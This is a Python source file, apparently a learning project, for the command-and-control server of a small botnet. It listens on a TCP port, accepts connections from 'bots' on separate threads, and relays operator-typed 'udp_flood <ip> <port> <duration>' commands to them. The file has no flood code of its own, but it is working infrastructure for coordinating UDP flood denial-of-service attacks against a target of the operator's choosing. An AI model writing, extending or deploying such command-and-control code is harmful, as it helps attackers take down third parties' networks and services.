import socket
import threading

# Sockets library will allow us to handle low-level network communication. This is used to create THE server socket,
# and accept connections and send/receive data connection == TCP, whereas udp_flood is using UDP sockets.

# Threading same thing as always, used to handle bots on seperate threads

# Function to handle communication with a single bot
def handle_bot(conn, addr): # conn: connected obj (the bot), and its ip address
    print(f"Bot connected from: {addr}")  # Log the bot's ip address to show succesful connection.

    while True:  # infinite loop till bot throw exception like termination.
        try:
            # Prompt the control server user to enter a command for the bot
            command = input("Enter Udp_flood params: (udp_flood <ip> <port> <duration>): ")
            conn.sendall(command.encode())
            # Sends command to each bot and encodes command into bytes during transmision.

            # If the command is "exit", terminate the connection with the bot
            if command.lower() == "exit":
                print("Shutting down connection with bot...")
                break

        # If an exception happens we're breaking out of the while loop.
        except Exception as e:
            print(f"ERROR!: {e}") # Displays the error for debugging purposes
            break
    conn.close()  # Terminate the connection after exiting the loop


# Runs the command-control server
def server(): #  Passive socket (passive endpoint)
    host = "192.168.1.136"  # IP address the server will bind to (replace as needed)
    port = 54321  # Port number to listen on

    try:
        # Create a TCP server socket using IPv4: (AF_INET), and TCP: (SOCK_STREAM)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # We modified the servers socket options to
        # reuse a port without waiting for timeout, aswell as setting the send and receive buffer sizes.
        s.bind((host, port))  # Bind the socket to server IP and port.
        s.listen(5)  # Start listening for incoming connections i.e: bots (max 5 queued)
        print(f"Server is running on {host}:{port}. Waiting for bots connections...")
        # Message displaying waiting for bots

        while True:
            # Accept an incoming bot connection
            conn, addr = s.accept()  # connection obj is created (the bot)
            print(f"Bot connected from: {addr}")

            # Start a new thread to handle the bot's connection
            thread = threading.Thread(target=handle_bot, args=(conn, addr))
            thread.start()
    except Exception as e:
        print(f"Error: {e}")  # Handle any errors setting up the server
    finally:
        s.close()  # Ensure the socket is closed when the server stops


# Entry point for the server script
if __name__ == "__main__":
    server()